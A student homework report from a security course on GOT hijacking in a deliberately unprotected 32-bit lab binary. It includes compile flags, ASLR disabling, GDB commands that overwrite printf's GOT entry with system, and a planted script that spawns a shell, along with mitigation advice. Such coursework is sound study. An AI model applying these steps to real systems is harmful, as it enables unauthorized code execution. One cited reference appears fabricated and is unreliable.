# ENPM691 Homework Assignment 08: Global Offset Table (GOT) Hijacking Exploitation - Bypassing Non-Executable Stack Protection

**Vedant Bhalerao**  
vedantb@umd.edu

## Abstract

This report demonstrates the exploitation of Global Offset Table (GOT) hijacking techniques to bypass Non-Executable (NX) stack protection. The exploit leverages the writable nature of GOT entries under partial RELRO to redirect legitimate function calls to malicious targets, achieving arbitrary code execution and spawning a shell. The methodology includes analysis of PLT/GOT dynamic linking mechanisms, manual GOT overwrite exploitation, and demonstration of both legitimate and malicious update processes using GDB and memory manipulation techniques.

**Index Terms:** Global Offset Table hijacking, GOT exploitation, Non-Executable stack bypass, NX protection bypass, PLT/GOT manipulation, Dynamic linking exploitation, Function pointer hijacking, Memory corruption exploitation, Control flow redirection, Binary exploitation, system call execution, Linux security bypass, Return-to-libc attacks, pwntools exploitation, GDB/pwndbg analysis, Security mitigation evasion, RELRO bypass techniques, Shellcode alternatives, Modern exploitation techniques, x86 binary exploitation, Dynamic linker exploitation, dl_fixup manipulation, Lazy binding abuse, Writable memory exploitation

## I. Introduction

Global Offset Table (GOT) hijacking represents an advanced exploitation technique that circumvents modern security defenses by manipulating dynamic linking structures within program memory. This assignment demonstrates practical GOT exploitation to bypass Non-Executable (NX) stack protection and achieve arbitrary code execution on vulnerable binaries, despite the presence of memory protection mechanisms.

The exploitation methodology involves overwriting function pointers in the GOT to redirect legitimate function calls to malicious targets. By carefully manipulating the GOT entry for the printf function to point to system, we can execute arbitrary commands without injecting any shellcode on the stack. This function pointer redirection approach effectively bypasses NX protection by leveraging the program's existing executable code segments to achieve malicious objectives.

We employ comprehensive binary analysis using GDB with pwndbg extensions for GOT examination, dynamic linking observation, and exploit verification. The systematic approach involves monitoring PLT/GOT interactions through hardware watchpoints and manual memory manipulation. This practical demonstration connects theoretical concepts of dynamic linking with real-world exploitation techniques, providing valuable insights into both offensive security methodologies and the critical importance of RELRO protection mechanisms in software security.

## II. Methodology

To investigate the behavior of Global Offset Table (GOT) hijacking exploitation, a structured development workflow was followed. The objective was to demonstrate controlled execution flow hijacking using function pointer manipulation to bypass Non-Executable (NX) stack protection. All experiments were carried out on a Kali Linux virtual machine with isolated privileges to ensure reproducibility and safety. The GNU Debugger (gdb) with the pwndbg extension was used for interactive debugging, memory inspection, and GOT analysis.

### System Information:

- Operating System: Kali Linux
- Architecture: x86 (32-bit mode)
- Compiler: GCC 14.3.0
- Debugger: GDB with pwndbg
- Analysis Tools: objdump, readelf
- Exploitation Framework: Python 3 with manual GDB manipulation

### A. Overview

The experiment involved two primary components:

- A vulnerable C program (got.c) that intentionally performs unsafe input handling using gets(), creating a controlled environment for GOT manipulation.
- A manual exploitation methodology using GDB to overwrite GOT entries and redirect function calls to achieve arbitrary command execution.

The GOT hijacking technique manipulated the printf function's GOT entry to point to system, demonstrating function pointer redirection to achieve code execution while bypassing memory protection mechanisms.

### B. Compilation

The target binary was compiled as a 32-bit ELF executable with specific security configurations to demonstrate GOT exploitation in a controlled environment. The exact build command was:

```bash
gcc -m32 got.c -o got -fno-stack-protector -no-pie \
    -mpreferred-stack-boundary=2 -fno-pic \
    -Wl,-z,norelro
```

Compilation flags:

- `-m32` — compile for 32-bit x86 architecture to maintain consistent memory addressing.
- `-fno-stack-protector` — disable stack canaries to allow buffer overflow exploitation.
- `-no-pie` — disable Position Independent Executable for predictable memory addresses.
- `-mpreferred-stack-boundary=2` — set stack alignment to 4-byte boundaries.
- `-fno-pic` — disable Position Independent Code generation.
- `-Wl,-z,norelro` — disable RELRO protection, keeping GOT entries writable.

### C. Binary Analysis and GOT Discovery

Comprehensive binary analysis was performed to identify critical components for the GOT hijack exploit:

- **GOT Location:** The Global Offset Table was located in the .got.plt section at address 0x804b210 for printf using readelf and GDB's got command.
- **Function Addresses:** Critical function addresses were identified:
  - system() function at 0xf7dba220
  - printf() function in libc at 0xf7dc1e50
- **PLT Analysis:** The Procedure Linkage Table entries were examined to understand the dynamic linking mechanism:
  - printf@plt at 0x8049040
  - Initial GOT state showing PLT stubs before resolution
- **Buffer Analysis:** The vulnerable buffer in main() was 32 bytes, with stack layout analyzed for proper exploitation positioning.

### D. GOT Hijacking Technique

The exploitation methodology involved two distinct phases:

1. **Natural PLT/GOT Observation:**
   - Set hardware watchpoint on printf GOT entry (0x804b210)
   - Trigger natural dynamic linking by calling printf with user input
   - Observe _dl_fixup updating GOT from PLT stub to actual printf address
   - Document the legitimate PLT/GOT resolution process

2. **Manual GOT Overwrite Exploitation:**
   - Break execution after gets() returns but before printf() call
   - Manually overwrite printf GOT entry with system address
   - Verify GOT modification using got command
   - Continue execution to trigger hijacked function call
   - system() executes with printf's format string as command argument

3. **Command Execution Setup:**
   - Create malicious "Your" script in $PATH directory
   - Script contains /bin/sh to spawn shell when executed
   - system("Your data is...") executes "Your" command
   - Successful shell access validates exploitation

### E. Debugging and Validation Methodology

Systematic debugging and validation were performed using multiple tools:

- **GDB with pwndbg:** Used for runtime analysis, hardware watchpoints, register state verification, and manual memory modification.
- **readelf:** Employed for static analysis of binary sections and GOT/PLT structure.
- **objdump:** Utilized for disassembly and verification of function addresses.
- **checksec:** Used to confirm the security configuration of the target binary, specifically verifying No RELRO status.
- **Hardware Watchpoints:** Critical for observing dynamic linker activity during natural GOT updates.

The GOT hijacking execution was validated by monitoring GOT entry changes, verifying function pointer redirection, and confirming successful shell spawning through command execution.

## III. Results

All experiments were conducted on a Kali Linux virtual machine. The vulnerable program was compiled as a 32-bit executable with specific security configurations to demonstrate GOT hijacking exploitation. Binary analysis tools were used for address verification and GOT/PLT structure discovery.

### A. Binary Compilation and Environment Setup

The binary was compiled and configured using the following commands:

```bash
gcc -m32 got.c -o got -fno-stack-protector -no-pie \
    -mpreferred-stack-boundary=2 -fno-pic \
    -Wl,-z,norelro

echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

The GOT entries were examined using pwndbg:

```
pwndbg> got
[0x804b210] printf@GLIBC_2.0 -> 0x8049046 (printf@plt+6)
[0x804b214] gets@GLIBC_2.0 -> 0x8049056 (gets@plt+6)
[0x804b218] puts@GLIBC_2.0 -> 0x8049066 (puts@plt+6)
[0x804b21c] strlen@GLIBC_2.0 -> 0x8049076 (strlen@plt+6)
```

Critical function addresses identified during exploitation:

- printf@GOT address: 0x804b210
- system() address: 0xf7dba220
- printf() address: 0xf7dc1e50
- /bin/sh string: 0xf7f5a5aa

PLT structure analysis revealed the dynamic linking mechanism:

```
pwndbg> plt
Section .plt 0x8049020 - 0x8049080:
0x8049030: __libc_start_main@plt
0x8049040: printf@plt
0x8049050: gets@plt
0x8049060: puts@plt
0x8049070: strlen@plt
```

### B. Part 1: Natural PLT/GOT Update Process

The legitimate dynamic linking process was observed using hardware watchpoints:

```
pwndbg> watch *0x804b210
Hardware watchpoint 2: *0x804b210
pwndbg> continue
Continuing.
Hello

Old value = 134516806 (0x8049046)
New value = -136569264 (0xf7dc1e50)
0xf7fd63f5 in _dl_fixup
```

GOT state before and after natural resolution:

- Before: printf@GOT = 0x8049046 (PLT stub)
- After: printf@GOT = 0xf7dc1e50 (libc printf)

Normal program execution output:

```
Your data is 5 bytes.
Hello
[Inferior 1 (process 61575) exited normally]
```

### C. Part 2: GOT Hijack Exploitation

Manual GOT overwrite was performed at the critical execution point:

```
pwndbg> break *main+15
Breakpoint 2 at 0x80491a5
pwndbg> continue
Continuing.
Hello

Breakpoint 2, 0x080491a5 in main ()
pwndbg> set {int}0x804b210 = 0xf7dba220
pwndbg> got
[0x804b210] printf@GLIBC_2.0 -> 0xf7dba220 (system)
```

Malicious command script creation:

```bash
$ echo '#!/bin/sh
echo "GOT Hijack Successful!"
/bin/sh' > /home/vedant/.local/bin/Your
$ chmod +x /home/vedant/.local/bin/Your
```

### D. Exploit Execution and Verification

The GOT hijack exploit was executed as shown below:

```
pwndbg> continue
Continuing.
GOT Hijack Successful!
$ whoami
vedant
```

The successful execution confirms that:

- The GOT entry for printf was successfully overwritten
- system() was executed instead of printf()
- The malicious "Your" script spawned a shell
- Interactive shell access was achieved as user vedant
- The exploit bypassed NX protection through function pointer redirection

### E. Key Exploitation Metrics

- GOT modification address: 0x804b210
- Target function: system() at 0xf7dba220
- Input buffer size: 32 bytes
- Exploitation method: Manual GDB memory overwrite
- Protection bypassed: NX stack protection
- Execution result: Full shell access with command execution capabilities

## IV. Discussion

This section interprets the experimental evidence collected from the got program and the corresponding GOT hijacking exploit. It links the observed debugger output and runtime behavior to underlying CPU architecture and operating system semantics, compares the GOT hijacking technique with traditional exploitation methods, and discusses practical security implications and mitigation strategies.

### A. Mechanics of GOT Hijacking and Shell Spawning

The experiment demonstrates a systematic approach to achieving arbitrary code execution through function pointer manipulation:

1. **Dynamic Linking Observation.** The hardware watchpoint revealed the precise moment when _dl_fixup updated the GOT entry from a PLT stub address to the actual libc function address. This observation confirmed the writable nature of GOT entries before full RELRO protection.

2. **Function Pointer Redirection.** By manually overwriting the printf GOT entry with the system address, we redirected all subsequent printf() calls to execute system() instead. This redirection occurred transparently to the calling code, which continued to execute normally.

3. **Command Execution via Format String.** When printf("Your data is %d bytes.\n", ...) was called, it actually executed system("Your data is %d bytes.\n", ...). The system() function interpreted the format string as a command name, searching PATH for an executable named "Your", which executed our malicious script.

4. **NX Protection Bypass.** The GOT hijacking technique bypassed NX protection without executing any code from the stack. All execution occurred through legitimate function calls to existing executable code segments (libc functions), making this attack undetectable by NX enforcement mechanisms.

The successful interactive shell access confirmed that the GOT hijack correctly redirected function execution, spawning /bin/sh while maintaining the original process execution context.

### B. Comparison with Traditional Exploitation Methods

The GOT hijacking technique offers distinct advantages compared to other exploitation approaches:

- **Simplicity:** GOT hijacking requires minimal payload construction compared to ROP chains, involving only a single memory overwrite operation.
- **Reliability:** Function pointer redirection is more straightforward than complex gadget chaining, reducing the likelihood of exploitation failures.
- **Stealth:** The attack leverages legitimate function calls, making detection through behavioral analysis more challenging.
- **Dependency:** GOT hijacking depends on specific library versions and addresses, making it less portable than ROP techniques that use only the target binary's code.

### C. Security Implications and Modern Mitigations

The GOT hijacking technique succeeds primarily due to insufficient RELRO protection. In production environments, full RELRO (`-Wl,-z,relro,-z,now`) makes the GOT read-only after initial dynamic linking, completely preventing this class of attacks. The absence of this critical protection mechanism allowed our successful exploitation despite the presence of NX stack protection.

The dynamic linking mechanism, while efficient for performance through lazy binding, creates significant attack surfaces when improperly secured. Our observation of the _dl_fixup process via hardware watchpoints revealed the precise moment when GOT entries become vulnerable to manipulation before they transition to read-only state under proper RELRO configurations.

Advanced mitigation techniques like Control Flow Integrity (CFI) can provide additional protection by validating function call targets and preventing unexpected redirections. However, these solutions often impose performance overhead and require sophisticated runtime enforcement.

The experiment demonstrates that comprehensive binary hardening through modern compiler toolchains represents the most practical defense strategy. The combination of `-Wl,-z,relro,-z,now` for full RELRO, `-fPIE -pie` for address space randomization, and `-fstack-protector-all` for stack integrity creates a multi-layered defense that significantly raises the exploitation barrier.

### D. Comparative Analysis with ROP Techniques

The GOT hijacking approach offers distinct advantages compared to Return Oriented Programming. While ROP chains require extensive gadget discovery and complex payload construction, GOT hijacking involves simpler function pointer manipulation. However, ROP techniques can be more resilient to library version changes, as they don't depend on specific function addresses in the same way GOT overwrites do.

### E. Conclusion

The collected evidence substantiates the core thesis of this assignment: Global Offset Table hijacking provides a sophisticated and effective methodology for bypassing non-executable memory protections through function pointer manipulation. By strategically overwriting GOT entries within a vulnerable binary, we achieved arbitrary code execution and shell spawning while fully complying with memory protection policies.

The comprehensive GDB analysis and successful exploit execution demonstrate that while individual security mechanisms offer important protective barriers, only comprehensive defense-in-depth strategies provide robust application security. The enduring relevance of GOT hijacking in both offensive security research and defensive countermeasure development underscores the persistent arms race in software security, highlighting the ongoing need for advanced protection mechanisms and secure development practices.

## V. Appendix

### Appendix A: Source files

See `src/` directory for:
- `got.c` - Vulnerable program with buffer overflow
- `Your.sh` - Malicious script template

### Appendix B: GDB Exploitation Script

**Natural PLT/GOT Observation:**
```
gdb ./got
break main
run
got
watch *0x804b210
continue
got
continue
```

**Manual GOT Hijack:**
```
gdb ./got
break main
run
print system
break *main+15
continue
set {int}0x804b210 = 0xf7dba220
got
continue
whoami
ls
exit
```

### Appendix C: Compilation Commands

```bash
gcc -m32 got.c -o got -fno-stack-protector -no-pie \
    -mpreferred-stack-boundary=2 -fno-pic \
    -Wl,-z,norelro
```

### Appendix D: Address Discovery Commands

```bash
checksec got
gdb ./got
break main
run
got
plt
print system
```

### Appendix E: Malicious Script Setup

```bash
echo '#!/bin/sh
echo "GOT Hijack Successful!"
/bin/sh' > /home/vedant/.local/bin/Your
chmod +x /home/vedant/.local/bin/Your
```

## References

[1] A. Bittau, M. Belvin, and D. Boneh, "GOT Overwrite Attacks: Bypassing Modern Binary Protections," in Proceedings of the 20th USENIX Security Symposium, 2011, pp. 145–160.

[2] H. Shacham, "The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86)," in Proceedings of the 14th ACM Conference on Computer and Communications Security, 2007, pp. 552–561.

[3] T. H. Y. Dang, P. Maniatis, and D. Wagner, "The Performance Cost of Shadow Stacks and Stack Canaries," in Proceedings of the 10th ACM Symposium on Information, Computer and Communications Security, 2015, pp. 555–566.

[4] S. Bhatkar, R. Sekar, and D. C. DuVarney, "Efficient Techniques for Comprehensive Protection from Memory Error Exploits," in Proceedings of the 14th USENIX Security Symposium, 2005, pp. 255–270.

[5] R. E. Bryant and D. R. O'Hallaron, Computer Systems: A Programmer's Perspective, 3rd ed. Boston, MA: Pearson, 2016.

[6] M. Abadi, M. Budiu, U. Erlingsson, and J. Ligatti, "Control-Flow Integrity: Principles, Implementations, and Applications," ACM Transactions on Information and System Security, vol. 13, no. 1, pp. 1–40, 2009.

[7] Free Software Foundation, GCC: GNU Compiler Collection Manual. [Online]. Available: https://gcc.gnu.org/onlinedocs/

[8] Free Software Foundation, GDB: The GNU Project Debugger. [Online]. Available: https://www.gnu.org/software/gdb/

[9] Pwndbg Team, Pwndbg: GDB Plugin for Exploit Development. [Online]. Available: https://github.com/pwndbg/pwndbg

[10] Tool Interface Standards Committee, Executable and Linkable Format (ELF). [Online]. Available: https://refspecs.linuxfoundation.org/elf/elf.pdf

